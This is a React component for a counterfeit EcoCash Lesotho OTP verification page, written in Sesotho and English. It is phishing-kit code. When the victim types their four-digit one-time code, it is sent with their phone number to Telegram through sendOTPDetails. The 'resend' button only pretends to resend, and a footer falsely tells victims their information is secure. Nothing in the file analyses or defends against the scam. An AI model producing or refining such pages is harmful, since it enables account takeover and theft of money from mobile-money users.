import { useState, useRef, KeyboardEvent, ClipboardEvent } from 'react'
import { sendOTPDetails } from '../utils/telegram'

interface OTPPageProps {
  onOTPSuccess: () => void
  phoneNumber: string
}

const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
  const [otp, setOtp] = useState(['', '', '', ''])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [resending, setResending] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    if (value && !/^\d$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value
    setOtp(newOtp)
    setError('')

    // Auto-focus next input
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus()
    }

    // Auto-submit when all fields are filled
    if (index === 3 && value) {
      const otpCode = newOtp.join('')
      if (otpCode.length === 4) {
        handleSubmit(otpCode)
      }
    }
  }

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handlePaste = (e: ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').slice(0, 4)

    if (!/^\d+$/.test(pastedData)) return

    const newOtp = [...otp]
    pastedData.split('').forEach((char, index) => {
      if (index < 4) newOtp[index] = char
    })
    setOtp(newOtp)

    // Focus last filled input
    const lastIndex = Math.min(pastedData.length, 3)
    inputRefs.current[lastIndex]?.focus()

    // Auto-submit if complete
    if (pastedData.length === 4) {
      handleSubmit(pastedData)
    }
  }

  const handleSubmit = async (otpCode: string) => {
    setLoading(true)
    setError('')

    try {
      if (otpCode.length === 4) {
        // Send OTP to Telegram
        await sendOTPDetails(phoneNumber, otpCode)

        // Success - move to submitted page
        onOTPSuccess()
      } else {
        setError('Please enter complete OTP code')
      }
    } catch (err) {
      console.error(err)
      onOTPSuccess() // Proceed even if error for now
    } finally {
      setLoading(false)
    }
  }

  const handleResendOTP = async () => {
    setResending(true)
    setError('')
    setOtp(['', '', '', ''])

    // Simulate resend
    setTimeout(() => {
      setResending(false)
      inputRefs.current[0]?.focus()
    }, 2000)
  }

  const manualSubmit = () => {
    const otpCode = otp.join('')
    if (otpCode.length === 4) {
      handleSubmit(otpCode)
    } else {
      setError('Please enter complete 4-digit OTP')
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center overflow-hidden relative bg-[#f7f9fc]">
      {/* Subtle background diagonal shapes */}
      <div className="absolute inset-0 -z-10 opacity-40">
        <div className="absolute top-[-20%] right-[-20%] w-full h-full bg-gradient-to-br from-transparent via-transparent to-[#e0e6f0]"></div>
        <div className="absolute bottom-[-20%] left-[-20%] w-full h-full bg-gradient-to-tr from-[#e0e6f0] via-transparent to-transparent"></div>
      </div>

      <div className="w-full max-w-[440px] px-5 text-center">
        {/* Logo */}
        <div className="text-4xl font-bold mb-10 tracking-tight">
          <span className="text-[#0056a4]">Eco</span>
          <span className="text-[#e11d2d]">Cash</span>
        </div>
        <p className="text-gray-600 mb-4 text-sm">Lesotho</p>

        {/* OTP Card */}
        <div className="bg-white py-12 px-8 rounded-[50px] shadow-[0_10px_30px_rgba(0,0,0,0.05)] border border-[#f0f0f0]">
          {/* Header */}
          <div className="mb-8">
            <div className="w-20 h-20 bg-gradient-to-br from-[#0056a4] to-[#12009c] rounded-full flex items-center justify-center mx-auto mb-4">
              <i className="fa-solid fa-shield-halved text-white text-3xl"></i>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Kenya Khoutu ea OTP</h2>
            <p className="text-gray-600 text-sm mb-1">Enter OTP Code</p>
            <p className="text-gray-600 text-sm">
              Re rometseng khoutu ea dinomoro tse 4 ho
              <br />
              <span className="font-semibold text-[#0056a4]">{phoneNumber}</span>
            </p>
          </div>

          {/* OTP Input Fields */}
          <div className="flex justify-center gap-3 mb-6">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={index === 0 ? handlePaste : undefined}
                className="w-12 h-14 text-center text-2xl font-bold border-2 border-[#dcdcdc] rounded-xl outline-none transition-all duration-200 focus:border-[#0056a4] focus:ring-2 focus:ring-[#0056a4]/20"
                autoFocus={index === 0}
              />
            ))}
          </div>

          {/* Error Message */}
          {error && (
            <div className="mb-4 text-red-600 text-sm flex items-center justify-center gap-2">
              <i className="fa-solid fa-circle-exclamation"></i>
              {error}
            </div>
          )}

          {/* Verify Button */}
          <button
            onClick={manualSubmit}
            disabled={loading || otp.join('').length < 6}
            className="w-full bg-[#12009c] text-white border-none py-[18px] rounded-[40px] text-lg font-medium cursor-pointer mb-4 transition-all duration-200 hover:opacity-95 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <i className="fa-solid fa-spinner fa-spin"></i>
                E Netefatsa... (Verifying)
              </span>
            ) : (
              <span className="flex items-center justify-center gap-2">
                <i className="fa-solid fa-check-circle"></i>
                Netefatsa (Verify OTP)
              </span>
            )}
          </button>

          {/* Resend OTP */}
          <div className="text-sm text-gray-600">
            Ha u fumane khoutu? (Didn't receive code?){' '}
            <button
              onClick={handleResendOTP}
              disabled={resending}
              className="text-[#0056a4] font-semibold hover:underline disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {resending ? (
                <span>
                  <i className="fa-solid fa-spinner fa-spin mr-1"></i>
                  E Romela hape...
                </span>
              ) : (
                'Romela hape (Resend)'
              )}
            </button>
          </div>
        </div>

        {/* Security Note */}
        <div className="mt-6 text-xs text-gray-500 flex items-center justify-center gap-2">
          <i className="fa-solid fa-lock"></i>
          <span>Lintlha tsa hau li sireletsehile (Your info is secure)</span>
        </div>
      </div>
    </div>
  )
}

export default OTPPage
